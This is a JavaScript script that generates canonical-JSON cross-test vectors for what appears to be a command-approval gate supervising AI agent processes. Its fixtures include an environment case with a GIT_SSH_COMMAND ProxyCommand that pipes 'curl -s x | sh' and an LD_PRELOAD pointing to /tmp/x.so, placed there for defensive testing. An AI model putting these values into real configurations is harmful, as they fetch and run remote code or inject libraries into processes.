// SPDX-License-Identifier: Apache-2.0
// Generator for canonical JSON cross-fixtures. The reference implementation is the plugin
// (JSON.stringify-based), which matches app/src/core/canonical.ts. Run from the monorepo root:
//   node protocol/vectors/gen_vectors.mjs > protocol/vectors/canonical_vectors.json
// One copy of the file: read by the daemon, app, and plugin tests.
import { canonicalJson, sha256Hex } from "../../plugin/src/canonical.js";

const envelope = {
  v: 1,
  type: "exec",
  argv: ["/bin/bash", "-c", "source ~/.snap && eval 'ls -la /tmp && echo \"done\" > /tmp/x <in'"],
  cwd: "/home/user/.openclaw/workspace",
  exe: "/usr/bin/bash",
  uid: 1000,
  gid: 1000,
  ppidChain: [
    { pid: 4242, exe: "/usr/bin/node" },
    { pid: 4200, exe: "/home/user/.local/share/claude/versions/2.1.283" },
  ],
  env: [
    { name: "HOME", value: "/home/user" },
    { name: "PATH", value: "/usr/local/bin:/usr/bin:/bin" },
  ],
  envHash: "fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000",
  requester: { host: "agent-host", supervisorId: "9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a" },
  pidfdCookie: "pidfs:123456",
  ts: 1790447985039,
  nonce: "00112233445566778899aabbccddeeff",
};

const cases = [
  { name: "envelope-v1-exec", value: envelope, envelope: true },
  { name: "envelope-unicode-argv", value: { ...envelope, argv: ["echo", "привет мир", "日本語", "emoji 😀", "tab\tnl\ncr\r", "ctl\u0001\u001f\u007f", "quote\"back\\slash", "ls sep ", "<&>"], cwd: "/tmp/каталог" }, envelope: true },
  { name: "empty-argv-chain", value: { ...envelope, argv: [], ppidChain: [], env: [] }, envelope: true },
  // finding 4 scenario: a harmless command with LD_PRELOAD; duplicate name (loader takes the last)
  // and a truncated value
  { name: "envelope-env-loader", value: { ...envelope, argv: ["ssh", "prod", "uptime"], exe: "/usr/bin/ssh", env: [
    { name: "LD_PRELOAD", value: "/usr/lib/libfaketime.so" },
    { name: "GIT_SSH_COMMAND", value: "ssh -o ProxyCommand='sh -c \"curl -s x | sh\"'" },
    { name: "LD_PRELOAD", value: "/tmp/x.so" },
    { name: "PYTHONPATH", value: "/tmp/каталог/" + "a".repeat(1011), cut: 5 },
  ] }, envelope: true },
  { name: "key-order-utf16", value: { "ﬀ": 1, "😀": 2, a: 3, B: 4, "": 5, "10": 6, "9": 7, "ä": 8 } },
  { name: "numbers", value: { a: 0, b: -1, c: 1.5, d: 1e21, e: 1e-7, f: 123456789012345, g: 0.000001, h: 2e-7, i: 1.7976931348623157e308, j: 5e-324, k: 100, l: 1e20, m: -0.5 } },
  { name: "nested-null-bool", value: { x: [null, true, false, { z: [], y: {} }], y: null } },
  // ticket signing strings: wardend exec record (type + supervisorId) and plugin tool call (type without supervisorId)
  { name: "decision-signing-string", value: { type: "wardenclaw.ticket.exec.v1", supervisorId: "39f713d0a644253f04529421b9f51b9b08979d08295959c4f3990ee617f5139f", deviceId: "a".repeat(64), id: "wd-0123456789abcdef0123456789abcdef", digest: "b".repeat(64), decision: "allow", ts: 1790447985039, nonce: "3b241101-e2bb-4255-8caf-4136c566a962" } },
  { name: "decision-signing-string-tool", value: { type: "wardenclaw.ticket.tool.v1", deviceId: "a".repeat(64), id: "c0ffee00-0000-4000-8000-000000000001", digest: "b".repeat(64), decision: "allow", ts: 1790447985039, nonce: "3b241101-e2bb-4255-8caf-4136c566a962" } },
];

const out = cases.map((c) => {
  const canonical = canonicalJson(c.value);
  return { name: c.name, envelope: !!c.envelope, value: c.value, canonical, sha256: sha256Hex(canonical) };
});
process.stdout.write(JSON.stringify({ generator: "wardenclaw-gate/src/canonical.js", cases: out }, null, 2) + "\n");
